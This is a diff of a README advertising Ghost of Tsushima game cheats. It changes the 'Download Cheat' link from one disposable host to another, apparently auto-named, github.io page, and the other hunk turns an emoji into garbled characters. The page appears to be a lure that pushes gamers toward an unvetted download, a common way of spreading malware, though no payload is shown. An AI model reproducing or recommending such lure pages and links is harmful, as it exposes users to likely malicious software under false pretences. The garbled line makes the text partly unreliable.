@@ -4,7 +4,7 @@
 
 Whether you're focused on perfect duels, open-world dominance, or stealth mastery — these cheats turn Tsushima into your personal battlefield.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload7.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://Ghost-of-Tsushima-Cheat-hug9.github.io/.github)
 ---
 
 ## 🧠 What Is a Ghost of Tsushima Cheat?
@@ -85,7 +85,7 @@ These cheats let you:
 * ❌ Avoid modding during online co-op
 * 🧼 Always backup saves before major cheats
 * 🔁 Keep cheat tools updated with latest patches
-* 🎥 Ideal for cinematic playthroughs & content creators
+* ���� Ideal for cinematic playthroughs & content creators
 
 ---
 
